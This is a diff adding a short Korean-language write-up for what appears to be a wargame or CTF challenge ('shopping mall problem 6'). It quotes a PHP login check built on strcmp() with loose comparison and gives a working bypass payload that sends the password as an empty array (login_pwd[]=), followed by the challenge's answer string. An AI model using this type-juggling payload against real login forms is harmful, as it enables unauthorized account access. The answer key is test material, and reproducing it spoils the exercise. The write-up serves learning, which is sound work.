@@ -1,0 +1,22 @@
+================================
+* 쇼핑몰 문제 6번
+================================
+
+1. 풀이과정
+f (strcmp(POST("login_id"),"answerxss@xss.com")==0&&strcmp(POST("login_pwd"),"Input_Random_PW")==0) {
+		session_regenerate_id();
+		session_start();
+		$_SESSION['LOGIN_ID'] = 'answerxss@xss.com';
+		$_SESSION['USER_NM'] = 'answer';
+
+		$resultDataArr['result']		= "Y";	
+	}else {
+		$resultDataArr['result']			= "N";
+	}
+
+소스코드를 확인해 로그인구조를 본 후 strcmp()함수를 보고 google에 검색 후 느슨한 비교 사이트에 들어감.
+==은 null값과 0을 비교했을때 true기때문에 이것을 이용해 리스트를 이용한 null값으로 비밀번호를 바꾼다
+login_id=answerxss%40xss.com&login_pwd[]=
+
+2.정답
+php_comparisons
